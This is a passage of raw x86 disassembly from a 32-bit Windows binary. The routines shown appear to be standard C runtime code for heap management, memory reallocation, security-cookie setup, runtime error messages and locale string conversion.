  427058:	mov    DWORD PTR [ebp+0x8],ebx
  42705b:	jb     0x42704d
  42705d:	cmp    ebx,eax
  42705f:	jne    0x42706f
  427061:	call   0x426a75
  427066:	mov    ebx,eax
  427068:	test   ebx,ebx
  42706a:	mov    DWORD PTR [ebp+0x8],ebx
  42706d:	je     0x427087
  42706f:	push   ebx
  427070:	call   0x426b2c
  427075:	pop    ecx
  427076:	mov    ecx,DWORD PTR [ebx+0x10]
  427079:	mov    DWORD PTR [ecx],eax
  42707b:	mov    eax,DWORD PTR [ebx+0x10]
  42707e:	cmp    DWORD PTR [eax],0xffffffff
  427081:	jne    0x426fab
  427087:	xor    eax,eax
  427089:	jmp    0x427208
  42708e:	shl    ecx,1
  427090:	inc    edi
  427091:	test   ecx,ecx
  427093:	jge    0x42708e
  427095:	mov    ecx,DWORD PTR [ebp-0xc]
  427098:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42709c:	mov    ecx,DWORD PTR [edx]
  42709e:	sub    ecx,DWORD PTR [ebp-0x10]
  4270a1:	mov    esi,ecx
  4270a3:	sar    esi,0x4
  4270a6:	dec    esi
  4270a7:	cmp    esi,0x3f
  4270aa:	mov    DWORD PTR [ebp-0x8],ecx
  4270ad:	jle    0x4270b2
  4270af:	push   0x3f
  4270b1:	pop    esi
  4270b2:	cmp    esi,edi
  4270b4:	je     0x4271bb
  4270ba:	mov    ecx,DWORD PTR [edx+0x4]
  4270bd:	cmp    ecx,DWORD PTR [edx+0x8]
  4270c0:	jne    0x42711e
  4270c2:	cmp    edi,0x20
  4270c5:	mov    ebx,0x80000000
  4270ca:	jge    0x4270f2
  4270cc:	mov    ecx,edi
  4270ce:	shr    ebx,cl
  4270d0:	mov    ecx,DWORD PTR [ebp-0x4]
  4270d3:	lea    edi,[eax+edi*1+0x4]
  4270d7:	not    ebx
  4270d9:	mov    DWORD PTR [ebp-0x14],ebx
  4270dc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4270e0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4270e4:	dec    BYTE PTR [edi]
  4270e6:	jne    0x42711b
  4270e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4270eb:	mov    ebx,DWORD PTR [ebp+0x8]
  4270ee:	and    DWORD PTR [ebx],ecx
  4270f0:	jmp    0x42711e
  4270f2:	lea    ecx,[edi-0x20]
  4270f5:	shr    ebx,cl
  4270f7:	mov    ecx,DWORD PTR [ebp-0x4]
  4270fa:	lea    ecx,[eax+ecx*4+0xc4]
  427101:	lea    edi,[eax+edi*1+0x4]
  427105:	not    ebx
  427107:	and    DWORD PTR [ecx],ebx
  427109:	dec    BYTE PTR [edi]
  42710b:	mov    DWORD PTR [ebp-0x14],ebx
  42710e:	jne    0x42711b
  427110:	mov    ebx,DWORD PTR [ebp+0x8]
  427113:	mov    ecx,DWORD PTR [ebp-0x14]
  427116:	and    DWORD PTR [ebx+0x4],ecx
  427119:	jmp    0x42711e
  42711b:	mov    ebx,DWORD PTR [ebp+0x8]
  42711e:	cmp    DWORD PTR [ebp-0x8],0x0
  427122:	mov    ecx,DWORD PTR [edx+0x8]
  427125:	mov    edi,DWORD PTR [edx+0x4]
  427128:	mov    DWORD PTR [ecx+0x4],edi
  42712b:	mov    ecx,DWORD PTR [edx+0x4]
  42712e:	mov    edi,DWORD PTR [edx+0x8]
  427131:	mov    DWORD PTR [ecx+0x8],edi
  427134:	je     0x4271c7
  42713a:	mov    ecx,DWORD PTR [ebp-0xc]
  42713d:	lea    ecx,[ecx+esi*8]
  427140:	mov    edi,DWORD PTR [ecx+0x4]
  427143:	mov    DWORD PTR [edx+0x8],ecx
  427146:	mov    DWORD PTR [edx+0x4],edi
  427149:	mov    DWORD PTR [ecx+0x4],edx
  42714c:	mov    ecx,DWORD PTR [edx+0x4]
  42714f:	mov    DWORD PTR [ecx+0x8],edx
  427152:	mov    ecx,DWORD PTR [edx+0x4]
  427155:	cmp    ecx,DWORD PTR [edx+0x8]
  427158:	jne    0x4271b8
  42715a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42715e:	mov    BYTE PTR [ebp+0xb],cl
  427161:	inc    cl
  427163:	cmp    esi,0x20
  427166:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42716a:	jge    0x42718f
  42716c:	cmp    BYTE PTR [ebp+0xb],0x0
  427170:	jne    0x42717d
  427172:	mov    edi,0x80000000
  427177:	mov    ecx,esi
  427179:	shr    edi,cl
  42717b:	or     DWORD PTR [ebx],edi
  42717d:	mov    ecx,esi
  42717f:	mov    edi,0x80000000
  427184:	shr    edi,cl
  427186:	mov    ecx,DWORD PTR [ebp-0x4]
  427189:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42718d:	jmp    0x4271b8
  42718f:	cmp    BYTE PTR [ebp+0xb],0x0
  427193:	jne    0x4271a2
  427195:	lea    ecx,[esi-0x20]
  427198:	mov    edi,0x80000000
  42719d:	shr    edi,cl
  42719f:	or     DWORD PTR [ebx+0x4],edi
  4271a2:	mov    ecx,DWORD PTR [ebp-0x4]
  4271a5:	lea    edi,[eax+ecx*4+0xc4]
  4271ac:	lea    ecx,[esi-0x20]
  4271af:	mov    esi,0x80000000
  4271b4:	shr    esi,cl
  4271b6:	or     DWORD PTR [edi],esi
  4271b8:	mov    ecx,DWORD PTR [ebp-0x8]
  4271bb:	test   ecx,ecx
  4271bd:	je     0x4271ca
  4271bf:	mov    DWORD PTR [edx],ecx
  4271c1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4271c5:	jmp    0x4271ca
  4271c7:	mov    ecx,DWORD PTR [ebp-0x8]
  4271ca:	mov    esi,DWORD PTR [ebp-0x10]
  4271cd:	add    edx,ecx
  4271cf:	lea    ecx,[esi+0x1]
  4271d2:	mov    DWORD PTR [edx],ecx
  4271d4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4271d8:	mov    esi,DWORD PTR [ebp-0xc]
  4271db:	mov    ecx,DWORD PTR [esi]
  4271dd:	test   ecx,ecx
  4271df:	lea    edi,[ecx+0x1]
  4271e2:	mov    DWORD PTR [esi],edi
  4271e4:	jne    0x427200
  4271e6:	cmp    ebx,DWORD PTR ds:0x45def8
  4271ec:	jne    0x427200
  4271ee:	mov    ecx,DWORD PTR [ebp-0x4]
  4271f1:	cmp    ecx,DWORD PTR ds:0x45df10
  4271f7:	jne    0x427200
  4271f9:	and    DWORD PTR ds:0x45def8,0x0
  427200:	mov    ecx,DWORD PTR [ebp-0x4]
  427203:	mov    DWORD PTR [eax],ecx
  427205:	lea    eax,[edx+0x4]
  427208:	pop    edi
  427209:	pop    esi
  42720a:	pop    ebx
  42720b:	leave  
  42720c:	ret    
  42720d:	int3   
  42720e:	int3   
  42720f:	int3   
  427210:	push   esi
  427211:	inc    ebx
  427212:	xor    dh,BYTE PTR [eax]
  427214:	pop    eax
  427215:	inc    ebx
  427216:	xor    BYTE PTR [eax],dh
  427218:	push   ebp
  427219:	mov    ebp,esp
  42721b:	sub    esp,0x8
  42721e:	push   ebx
  42721f:	push   esi
  427220:	push   edi
  427221:	push   ebp
  427222:	cld    
  427223:	mov    ebx,DWORD PTR [ebp+0xc]
  427226:	mov    eax,DWORD PTR [ebp+0x8]
  427229:	test   DWORD PTR [eax+0x4],0x6
  427230:	jne    0x4272b8
  427236:	mov    DWORD PTR [ebp-0x8],eax
  427239:	mov    eax,DWORD PTR [ebp+0x10]
  42723c:	mov    DWORD PTR [ebp-0x4],eax
  42723f:	lea    eax,[ebp-0x8]
  427242:	mov    DWORD PTR [ebx-0x4],eax
  427245:	mov    esi,DWORD PTR [ebx+0xc]
  427248:	mov    edi,DWORD PTR [ebx+0x8]
  42724b:	cmp    esi,0xffffffff
  42724e:	je     0x4272b1
  427250:	lea    ecx,[esi+esi*2]
  427253:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  427258:	je     0x42729f
  42725a:	push   esi
  42725b:	push   ebp
  42725c:	lea    ebp,[ebx+0x10]
  42725f:	call   DWORD PTR [edi+ecx*4+0x4]
  427263:	pop    ebp
  427264:	pop    esi
  427265:	mov    ebx,DWORD PTR [ebp+0xc]
  427268:	or     eax,eax
  42726a:	je     0x42729f
  42726c:	js     0x4272aa
  42726e:	mov    edi,DWORD PTR [ebx+0x8]
  427271:	push   ebx
  427272:	call   0x4281a0
  427277:	add    esp,0x4
  42727a:	lea    ebp,[ebx+0x10]
  42727d:	push   esi
  42727e:	push   ebx
  42727f:	call   0x4281e2
  427284:	add    esp,0x8
  427287:	lea    ecx,[esi+esi*2]
  42728a:	push   0x1
  42728c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  427290:	call   0x428276
  427295:	mov    eax,DWORD PTR [edi+ecx*4]
  427298:	mov    DWORD PTR [ebx+0xc],eax
  42729b:	call   DWORD PTR [edi+ecx*4+0x8]
  42729f:	mov    edi,DWORD PTR [ebx+0x8]
  4272a2:	lea    ecx,[esi+esi*2]
  4272a5:	mov    esi,DWORD PTR [edi+ecx*4]
  4272a8:	jmp    0x42724b
  4272aa:	mov    eax,0x0
  4272af:	jmp    0x4272cd
  4272b1:	mov    eax,0x1
  4272b6:	jmp    0x4272cd
  4272b8:	push   ebp
  4272b9:	lea    ebp,[ebx+0x10]
  4272bc:	push   0xffffffff
  4272be:	push   ebx
  4272bf:	call   0x4281e2
  4272c4:	add    esp,0x8
  4272c7:	pop    ebp
  4272c8:	mov    eax,0x1
  4272cd:	pop    ebp
  4272ce:	pop    edi
  4272cf:	pop    esi
  4272d0:	pop    ebx
  4272d1:	mov    esp,ebp
  4272d3:	pop    ebp
  4272d4:	ret    
  4272d5:	push   ebp
  4272d6:	mov    ecx,DWORD PTR [esp+0x8]
  4272da:	mov    ebp,DWORD PTR [ecx]
  4272dc:	mov    eax,DWORD PTR [ecx+0x1c]
  4272df:	push   eax
  4272e0:	mov    eax,DWORD PTR [ecx+0x18]
  4272e3:	push   eax
  4272e4:	call   0x4281e2
  4272e9:	add    esp,0x8
  4272ec:	pop    ebp
  4272ed:	ret    0x4
  4272f0:	call   0x425203
  4272f5:	add    eax,0x8
  4272f8:	ret    
  4272f9:	push   0x14
  4272fb:	push   0x429880
  427300:	call   0x425350
  427305:	mov    edi,DWORD PTR [ebp+0x8]
  427308:	xor    ebx,ebx
  42730a:	cmp    edi,ebx
  42730c:	jne    0x42731c
  42730e:	push   DWORD PTR [ebp+0xc]
  427311:	call   0x426072
  427316:	pop    ecx
  427317:	jmp    0x4274a0
  42731c:	mov    esi,DWORD PTR [ebp+0xc]
  42731f:	cmp    esi,ebx
  427321:	jne    0x42732f
  427323:	push   edi
  427324:	call   0x425f5a
  427329:	pop    ecx
  42732a:	jmp    0x42749e
  42732f:	cmp    DWORD PTR ds:0x45e144,0x3
  427336:	jne    0x42746a
  42733c:	mov    DWORD PTR [ebp-0x1c],ebx
  42733f:	cmp    esi,0xffffffe0
  427342:	ja     0x427439
  427348:	push   0x4
  42734a:	call   0x42550f
  42734f:	pop    ecx
  427350:	mov    DWORD PTR [ebp-0x4],ebx
  427353:	push   edi
  427354:	call   0x426732
  427359:	pop    ecx
  42735a:	mov    DWORD PTR [ebp-0x20],eax
  42735d:	cmp    eax,ebx
  42735f:	je     0x427409
  427365:	cmp    esi,DWORD PTR ds:0x45df04
  42736b:	ja     0x4273b9
  42736d:	push   esi
  42736e:	push   edi
  42736f:	push   eax
  427370:	call   0x426c32
  427375:	add    esp,0xc
  427378:	test   eax,eax
  42737a:	je     0x427381
  42737c:	mov    DWORD PTR [ebp-0x1c],edi
  42737f:	jmp    0x4273b9
  427381:	push   esi
  427382:	call   0x426f11
  427387:	pop    ecx
  427388:	mov    DWORD PTR [ebp-0x1c],eax
  42738b:	cmp    eax,ebx
  42738d:	je     0x4273b9
  42738f:	mov    eax,DWORD PTR [edi-0x4]
  427392:	dec    eax
  427393:	mov    DWORD PTR [ebp-0x24],eax
  427396:	cmp    eax,esi
  427398:	jb     0x42739c
  42739a:	mov    eax,esi
  42739c:	push   eax
  42739d:	push   edi
  42739e:	push   DWORD PTR [ebp-0x1c]
  4273a1:	call   0x426090
  4273a6:	push   edi
  4273a7:	call   0x426732
  4273ac:	mov    DWORD PTR [ebp-0x20],eax
  4273af:	push   edi
  4273b0:	push   eax
  4273b1:	call   0x42675d
  4273b6:	add    esp,0x18
  4273b9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4273bc:	jne    0x427409
  4273be:	cmp    esi,ebx
  4273c0:	jne    0x4273c8
  4273c2:	xor    esi,esi
  4273c4:	inc    esi
  4273c5:	mov    DWORD PTR [ebp+0xc],esi
  4273c8:	add    esi,0xf
  4273cb:	and    esi,0xfffffff0
  4273ce:	mov    DWORD PTR [ebp+0xc],esi
  4273d1:	push   esi
  4273d2:	push   ebx
  4273d3:	push   DWORD PTR ds:0x45e140
  4273d9:	call   DWORD PTR ds:0x429030
  4273df:	mov    DWORD PTR [ebp-0x1c],eax
  4273e2:	cmp    eax,ebx
  4273e4:	je     0x427409
  4273e6:	mov    eax,DWORD PTR [edi-0x4]
  4273e9:	dec    eax
  4273ea:	mov    DWORD PTR [ebp-0x24],eax
  4273ed:	cmp    eax,esi
  4273ef:	jb     0x4273f3
  4273f1:	mov    eax,esi
  4273f3:	push   eax
  4273f4:	push   edi
  4273f5:	push   DWORD PTR [ebp-0x1c]
  4273f8:	call   0x426090
  4273fd:	push   edi
  4273fe:	push   DWORD PTR [ebp-0x20]
  427401:	call   0x42675d
  427406:	add    esp,0x14
  427409:	or     DWORD PTR [ebp-0x4],0xffffffff
  42740d:	call   0x427461
  427412:	cmp    DWORD PTR [ebp-0x20],ebx
  427415:	jne    0x427439
  427417:	cmp    esi,ebx
  427419:	jne    0x42741e
  42741b:	xor    esi,esi
  42741d:	inc    esi
  42741e:	add    esi,0xf
  427421:	and    esi,0xfffffff0
  427424:	mov    DWORD PTR [ebp+0xc],esi
  427427:	push   esi
  427428:	push   edi
  427429:	push   ebx
  42742a:	push   DWORD PTR ds:0x45e140
  427430:	call   DWORD PTR ds:0x4290d4
  427436:	mov    DWORD PTR [ebp-0x1c],eax
  427439:	mov    eax,DWORD PTR [ebp-0x1c]
  42743c:	cmp    eax,ebx
  42743e:	jne    0x4274a0
  427440:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427446:	je     0x4274a0
  427448:	push   esi
  427449:	call   0x427c32
  42744e:	pop    ecx
  42744f:	test   eax,eax
  427451:	jne    0x42733c
  427457:	jmp    0x42749e
  427459:	xor    ebx,ebx
  42745b:	mov    esi,DWORD PTR [ebp+0xc]
  42745e:	mov    edi,DWORD PTR [ebp+0x8]
  427461:	push   0x4
  427463:	call   0x42547b
  427468:	pop    ecx
  427469:	ret    
  42746a:	xor    eax,eax
  42746c:	cmp    esi,0xffffffe0
  42746f:	ja     0x427487
  427471:	cmp    esi,ebx
  427473:	jne    0x427478
  427475:	xor    esi,esi
  427477:	inc    esi
  427478:	push   esi
  427479:	push   edi
  42747a:	push   ebx
  42747b:	push   DWORD PTR ds:0x45e140
  427481:	call   DWORD PTR ds:0x4290d4
  427487:	cmp    eax,ebx
  427489:	jne    0x4274a0
  42748b:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427491:	je     0x4274a0
  427493:	push   esi
  427494:	call   0x427c32
  427499:	pop    ecx
  42749a:	test   eax,eax
  42749c:	jne    0x42746a
  42749e:	xor    eax,eax
  4274a0:	call   0x42538b
  4274a5:	ret    
  4274a6:	push   0x10
  4274a8:	push   0x429890
  4274ad:	call   0x425350
  4274b2:	cmp    DWORD PTR ds:0x45e144,0x3
  4274b9:	jne    0x4274f5
  4274bb:	push   0x4
  4274bd:	call   0x42550f
  4274c2:	pop    ecx
  4274c3:	and    DWORD PTR [ebp-0x4],0x0
  4274c7:	mov    esi,DWORD PTR [ebp+0x8]
  4274ca:	push   esi
  4274cb:	call   0x426732
  4274d0:	pop    ecx
  4274d1:	mov    DWORD PTR [ebp-0x1c],eax
  4274d4:	test   eax,eax
  4274d6:	je     0x4274e3
  4274d8:	mov    esi,DWORD PTR [esi-0x4]
  4274db:	sub    esi,0x9
  4274de:	mov    DWORD PTR [ebp-0x20],esi
  4274e1:	jmp    0x4274e6
  4274e3:	mov    esi,DWORD PTR [ebp-0x20]
  4274e6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4274ea:	call   0x427513
  4274ef:	cmp    DWORD PTR [ebp-0x1c],0x0
  4274f3:	jne    0x427508
  4274f5:	push   DWORD PTR [ebp+0x8]
  4274f8:	push   0x0
  4274fa:	push   DWORD PTR ds:0x45e140
  427500:	call   DWORD PTR ds:0x4290d8
  427506:	mov    esi,eax
  427508:	mov    eax,esi
  42750a:	call   0x42538b
  42750f:	ret    
  427510:	mov    esi,DWORD PTR [ebp-0x20]
  427513:	push   0x4
  427515:	call   0x42547b
  42751a:	pop    ecx
  42751b:	ret    
  42751c:	push   ebp
  42751d:	mov    ebp,esp
  42751f:	sub    esp,0x10
  427522:	push   esi
  427523:	lea    eax,[ebp-0x8]
  427526:	push   eax
  427527:	call   DWORD PTR ds:0x4290e8
  42752d:	mov    esi,DWORD PTR [ebp-0x4]
  427530:	xor    esi,DWORD PTR [ebp-0x8]
  427533:	call   DWORD PTR ds:0x4290e4
  427539:	xor    esi,eax
  42753b:	call   DWORD PTR ds:0x42909c
  427541:	xor    esi,eax
  427543:	call   DWORD PTR ds:0x4290e0
  427549:	xor    esi,eax
  42754b:	lea    eax,[ebp-0x10]
  42754e:	push   eax
  42754f:	call   DWORD PTR ds:0x4290dc
  427555:	mov    eax,DWORD PTR [ebp-0xc]
  427558:	xor    eax,DWORD PTR [ebp-0x10]
  42755b:	xor    esi,eax
  42755d:	mov    DWORD PTR ds:0x45d430,esi
  427563:	jne    0x42756f
  427565:	mov    DWORD PTR ds:0x45d430,0xbb40e64e
  42756f:	pop    esi
  427570:	leave  
  427571:	ret    
  427572:	push   0x118
  427577:	push   0x429a40
  42757c:	call   0x425350
  427581:	mov    eax,ds:0x45d430
  427586:	xor    eax,DWORD PTR [ebp+0x4]
  427589:	mov    DWORD PTR [ebp-0x1c],eax
  42758c:	mov    eax,ds:0x45dd98
  427591:	xor    ecx,ecx
  427593:	cmp    eax,ecx
  427595:	je     0x4275b6
  427597:	mov    DWORD PTR [ebp-0x4],ecx
  42759a:	push   DWORD PTR [ebp+0xc]
  42759d:	push   DWORD PTR [ebp+0x8]
  4275a0:	call   eax
  4275a2:	pop    ecx
  4275a3:	pop    ecx
  4275a4:	or     DWORD PTR [ebp-0x4],0xffffffff
  4275a8:	jmp    0x4276b4
  4275ad:	xor    eax,eax
  4275af:	inc    eax
  4275b0:	ret    
  4275b1:	mov    esp,DWORD PTR [ebp-0x18]
  4275b4:	jmp    0x4275a4
  4275b6:	mov    eax,DWORD PTR [ebp+0x8]
  4275b9:	dec    eax
  4275ba:	je     0x4275cf
  4275bc:	mov    edi,0x429a1c
  4275c1:	mov    DWORD PTR [ebp-0x20],0x429968
  4275c8:	mov    esi,0xd4
  4275cd:	jmp    0x4275e0
  4275cf:	mov    edi,0x429948
  4275d4:	mov    DWORD PTR [ebp-0x20],0x4298a8
  4275db:	mov    esi,0xb9
  4275e0:	mov    BYTE PTR [ebp-0x24],cl
  4275e3:	push   0x104
  4275e8:	lea    eax,[ebp-0x128]
  4275ee:	push   eax
  4275ef:	push   ecx
  4275f0:	call   DWORD PTR ds:0x42906c
  4275f6:	test   eax,eax
  4275f8:	jne    0x42760d
  4275fa:	push   0x42959c
  4275ff:	lea    eax,[ebp-0x128]
  427605:	push   eax
  427606:	call   0x425730
  42760b:	pop    ecx
  42760c:	pop    ecx
  42760d:	lea    ebx,[ebp-0x128]
  427613:	lea    eax,[ebp-0x128]
  427619:	push   eax
  42761a:	call   0x425960
  42761f:	pop    ecx
  427620:	add    eax,0xb
  427623:	cmp    eax,0x3c
  427626:	jbe    0x427651
  427628:	lea    eax,[ebp-0x128]
  42762e:	push   eax
  42762f:	call   0x425960
  427634:	mov    ebx,eax
  427636:	lea    eax,[ebp-0x128]
  42763c:	sub    eax,0x31
  42763f:	add    ebx,eax
  427641:	push   0x3
  427643:	push   0x429598
  427648:	push   ebx
  427649:	call   0x425830
  42764e:	add    esp,0x10
  427651:	push   ebx
  427652:	call   0x425960
  427657:	pop    ecx
  427658:	lea    eax,[eax+esi*1+0xc]
  42765c:	add    eax,0x3
  42765f:	and    eax,0xfffffffc
  427662:	call   0x4253a0
  427667:	mov    DWORD PTR [ebp-0x18],esp
  42766a:	mov    esi,esp
  42766c:	push   edi
  42766d:	push   esi
  42766e:	call   0x425730
  427673:	mov    edi,0x429578
  427678:	push   edi
  427679:	push   esi
  42767a:	call   0x425740
  42767f:	push   0x42989c
  427684:	push   esi
  427685:	call   0x425740
  42768a:	push   ebx
  42768b:	push   esi
  42768c:	call   0x425740
  427691:	push   edi
  427692:	push   esi
  427693:	call   0x425740
  427698:	push   DWORD PTR [ebp-0x20]
  42769b:	push   esi
  42769c:	call   0x425740
  4276a1:	push   0x12010
  4276a6:	push   0x429550
  4276ab:	push   esi
  4276ac:	call   0x425632
  4276b1:	add    esp,0x3c
  4276b4:	push   0x3
  4276b6:	call   0x4247bc
  4276bb:	int3   
  4276bc:	push   0x38
  4276be:	push   0x429e60
  4276c3:	call   0x425350
  4276c8:	xor    ebx,ebx
  4276ca:	cmp    DWORD PTR ds:0x45ddbc,ebx
  4276d0:	jne    0x42770a
  4276d2:	push   ebx
  4276d3:	push   ebx
  4276d4:	xor    esi,esi
  4276d6:	inc    esi
  4276d7:	push   esi
  4276d8:	push   0x429e5c
  4276dd:	push   0x100
  4276e2:	push   ebx
  4276e3:	call   DWORD PTR ds:0x4290f4
  4276e9:	test   eax,eax
  4276eb:	je     0x4276f5
  4276ed:	mov    DWORD PTR ds:0x45ddbc,esi
  4276f3:	jmp    0x42770a
  4276f5:	call   DWORD PTR ds:0x429028
  4276fb:	cmp    eax,0x78
  4276fe:	jne    0x42770a
  427700:	mov    DWORD PTR ds:0x45ddbc,0x2
  42770a:	cmp    DWORD PTR [ebp+0x14],ebx
  42770d:	jle    0x42772a
  42770f:	mov    ecx,DWORD PTR [ebp+0x14]
  427712:	mov    eax,DWORD PTR [ebp+0x10]
  427715:	dec    ecx
  427716:	cmp    BYTE PTR [eax],bl
  427718:	je     0x427722
  42771a:	inc    eax
  42771b:	cmp    ecx,ebx
  42771d:	jne    0x427715
  42771f:	or     ecx,0xffffffff
  427722:	or     eax,0xffffffff
  427725:	sub    eax,ecx
  427727:	add    DWORD PTR [ebp+0x14],eax
  42772a:	mov    eax,ds:0x45ddbc
  42772f:	cmp    eax,0x2
  427732:	je     0x427914
  427738:	cmp    eax,ebx
  42773a:	je     0x427914
  427740:	cmp    eax,0x1
  427743:	jne    0x427947
  427749:	xor    edi,edi
  42774b:	mov    DWORD PTR [ebp-0x1c],edi
  42774e:	mov    DWORD PTR [ebp-0x20],ebx
  427751:	mov    DWORD PTR [ebp-0x24],ebx
  427754:	cmp    DWORD PTR [ebp+0x20],ebx
  427757:	jne    0x427761
  427759:	mov    eax,ds:0x45ddb4
  42775e:	mov    DWORD PTR [ebp+0x20],eax
  427761:	push   ebx
  427762:	push   ebx
  427763:	push   DWORD PTR [ebp+0x14]
  427766:	push   DWORD PTR [ebp+0x10]
  427769:	xor    eax,eax
  42776b:	cmp    DWORD PTR [ebp+0x24],ebx
  42776e:	setne  al
  427771:	lea    eax,[eax*8+0x1]
  427778:	push   eax
  427779:	push   DWORD PTR [ebp+0x20]
  42777c:	call   DWORD PTR ds:0x4290f0
  427782:	mov    esi,eax
  427784:	mov    DWORD PTR [ebp-0x28],esi
  427787:	cmp    esi,ebx
  427789:	je     0x427947
  42778f:	mov    DWORD PTR [ebp-0x4],0x1
  427796:	lea    eax,[esi+esi*1]
  427799:	add    eax,0x3
  42779c:	and    eax,0xfffffffc
  42779f:	call   0x4253a0
  4277a4:	mov    DWORD PTR [ebp-0x18],esp
  4277a7:	mov    eax,esp
  4277a9:	mov    DWORD PTR [ebp-0x2c],eax
  4277ac:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277b0:	jmp    0x4277cd
  4277b2:	xor    eax,eax
  4277b4:	inc    eax
  4277b5:	ret    
  4277b6:	mov    esp,DWORD PTR [ebp-0x18]
  4277b9:	call   0x4287e5
  4277be:	xor    ebx,ebx
  4277c0:	mov    DWORD PTR [ebp-0x2c],ebx
  4277c3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277c7:	mov    edi,DWORD PTR [ebp-0x1c]
  4277ca:	mov    esi,DWORD PTR [ebp-0x28]
  4277cd:	cmp    DWORD PTR [ebp-0x2c],ebx
  4277d0:	jne    0x4277ee
  4277d2:	lea    eax,[esi+esi*1]
  4277d5:	push   eax
  4277d6:	call   0x426072
  4277db:	pop    ecx
  4277dc:	mov    DWORD PTR [ebp-0x2c],eax
  4277df:	cmp    eax,ebx
  4277e1:	je     0x427947
  4277e7:	mov    DWORD PTR [ebp-0x20],0x1
  4277ee:	push   esi
  4277ef:	push   DWORD PTR [ebp-0x2c]
  4277f2:	push   DWORD PTR [ebp+0x14]
  4277f5:	push   DWORD PTR [ebp+0x10]
  4277f8:	push   0x1
  4277fa:	push   DWORD PTR [ebp+0x20]
  4277fd:	call   DWORD PTR ds:0x4290f0
  427803:	test   eax,eax
  427805:	je     0x4278f1
  42780b:	push   ebx
  42780c:	push   ebx
  42780d:	push   esi
  42780e:	push   DWORD PTR [ebp-0x2c]
  427811:	push   DWORD PTR [ebp+0xc]
  427814:	push   DWORD PTR [ebp+0x8]
  427817:	call   DWORD PTR ds:0x4290f4
  42781d:	mov    edi,eax
  42781f:	mov    DWORD PTR [ebp-0x1c],edi
  427822:	cmp    edi,ebx
  427824:	je     0x4278f1
  42782a:	test   BYTE PTR [ebp+0xd],0x4
  42782e:	je     0x42785d
  427830:	cmp    DWORD PTR [ebp+0x1c],ebx
  427833:	je     0x4278f1
  427839:	cmp    edi,DWORD PTR [ebp+0x1c]
  42783c:	jg     0x4278f1
  427842:	push   DWORD PTR [ebp+0x1c]
  427845:	push   DWORD PTR [ebp+0x18]
  427848:	push   esi
  427849:	push   DWORD PTR [ebp-0x2c]
  42784c:	push   DWORD PTR [ebp+0xc]
  42784f:	push   DWORD PTR [ebp+0x8]
  427852:	call   DWORD PTR ds:0x4290f4
  427858:	jmp    0x4278f1
  42785d:	mov    DWORD PTR [ebp-0x4],0x2
  427864:	lea    eax,[edi+edi*1]
  427867:	add    eax,0x3
  42786a:	and    eax,0xfffffffc
  42786d:	call   0x4253a0
  427872:	mov    DWORD PTR [ebp-0x18],esp
  427875:	mov    eax,esp
  427877:	mov    DWORD PTR [ebp-0x30],eax
  42787a:	or     DWORD PTR [ebp-0x4],0xffffffff
  42787e:	jmp    0x42789b
  427880:	xor    eax,eax
  427882:	inc    eax
  427883:	ret    
  427884:	mov    esp,DWORD PTR [ebp-0x18]
  427887:	call   0x4287e5
  42788c:	xor    ebx,ebx
  42788e:	mov    DWORD PTR [ebp-0x30],ebx
  427891:	or     DWORD PTR [ebp-0x4],0xffffffff
  427895:	mov    edi,DWORD PTR [ebp-0x1c]
  427898:	mov    esi,DWORD PTR [ebp-0x28]
  42789b:	cmp    DWORD PTR [ebp-0x30],ebx
  42789e:	jne    0x4278b8
  4278a0:	lea    eax,[edi+edi*1]
  4278a3:	push   eax
  4278a4:	call   0x426072
  4278a9:	pop    ecx
  4278aa:	mov    DWORD PTR [ebp-0x30],eax
  4278ad:	cmp    eax,ebx
  4278af:	je     0x4278f1
  4278b1:	mov    DWORD PTR [ebp-0x24],0x1
  4278b8:	push   edi
  4278b9:	push   DWORD PTR [ebp-0x30]
  4278bc:	push   esi
  4278bd:	push   DWORD PTR [ebp-0x2c]
  4278c0:	push   DWORD PTR [ebp+0xc]
  4278c3:	push   DWORD PTR [ebp+0x8]
  4278c6:	call   DWORD PTR ds:0x4290f4
  4278cc:	test   eax,eax
  4278ce:	je     0x4278f1
  4278d0:	push   ebx
  4278d1:	push   ebx
  4278d2:	cmp    DWORD PTR [ebp+0x1c],ebx
  4278d5:	jne    0x4278db
  4278d7:	push   ebx
  4278d8:	push   ebx
  4278d9:	jmp    0x4278e1
  4278db:	push   DWORD PTR [ebp+0x1c]
  4278de:	push   DWORD PTR [ebp+0x18]
  4278e1:	push   edi
  4278e2:	push   DWORD PTR [ebp-0x30]
  4278e5:	push   ebx
  4278e6:	push   DWORD PTR [ebp+0x20]
  4278e9:	call   DWORD PTR ds:0x429080
  4278ef:	mov    edi,eax
  4278f1:	cmp    DWORD PTR [ebp-0x24],ebx
  4278f4:	je     0x4278ff
  4278f6:	push   DWORD PTR [ebp-0x30]
  4278f9:	call   0x425f5a
  4278fe:	pop    ecx
  4278ff:	cmp    DWORD PTR [ebp-0x20],ebx
  427902:	je     0x42790d
  427904:	push   DWORD PTR [ebp-0x2c]
  427907:	call   0x425f5a
  42790c:	pop    ecx
  42790d:	mov    eax,edi
  42790f:	jmp    0x427a6f
  427914:	mov    DWORD PTR [ebp-0x34],ebx
  427917:	xor    edi,edi
  427919:	mov    DWORD PTR [ebp-0x38],ebx
  42791c:	cmp    DWORD PTR [ebp+0x8],ebx
  42791f:	jne    0x427929
  427921:	mov    eax,ds:0x45dda4
  427926:	mov    DWORD PTR [ebp+0x8],eax
  427929:	cmp    DWORD PTR [ebp+0x20],ebx
  42792c:	jne    0x427936
  42792e:	mov    eax,ds:0x45ddb4
  427933:	mov    DWORD PTR [ebp+0x20],eax
  427936:	push   DWORD PTR [ebp+0x8]
  427939:	call   0x4285cd
  42793e:	pop    ecx
  42793f:	mov    DWORD PTR [ebp-0x3c],eax
  427942:	cmp    eax,0xffffffff
  427945:	jne    0x42794e
